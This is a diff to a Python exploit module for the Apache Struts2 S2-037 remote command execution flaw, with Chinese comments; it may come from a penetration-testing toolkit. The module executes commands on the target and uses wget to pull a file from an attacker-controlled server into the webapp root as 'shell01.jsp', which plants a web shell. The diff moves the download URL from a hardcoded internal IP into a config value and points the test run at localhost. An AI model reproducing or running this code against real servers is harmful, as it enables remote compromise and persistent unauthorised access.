@@ -1,7 +1,8 @@
 # coding:utf-8
 import sys
-from exp_template import Exploit, Level, session
+from struts2.exp_template import Exploit, Level, session
 
+from conf import config
 """
 构造函数需要传递以下参数
 url   测试目标的url
@@ -77,7 +78,7 @@ class S2037(Exploit):
             return False
 
     def wgetfile(self, serverurl, filepath):
-        cmd = ''' wget {} -O {}test.jsp'''.format(serverurl, filepath)
+        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
         response = self.executecmd(cmd)
         return response
 
@@ -88,9 +89,9 @@ class S2037(Exploit):
         poc = self.pocurl()
         if poc:
             # 获取webapp的根目录
-            webpath = self.getwebpath()
+            webpath = self.getwebpath().strip()
             if webpath:
-                serverurl = '''http://172.22.209.33:8014/api/download'''
+                serverurl = config['serverurl']
                 res = self.wgetfile(serverurl, webpath)
                 if res:
                     self.report('wget file {}'.format(res), Level.info)
@@ -98,7 +99,12 @@ class S2037(Exploit):
 
 
 if __name__ == '__main__':
-    if len(sys.argv) == 2:
-        s = S2037(sys.argv[1])
-        res = s.exploit()
-        print res
+    # 测试使用
+    url = "http://localhost:8080/orders/4"
+    s = S2037(url)
+    res = s.exploit()
+    print res
+    # if len(sys.argv) == 2:
+    #     s = S2037(sys.argv[1])
+    #     res = s.exploit()
+    #     print res
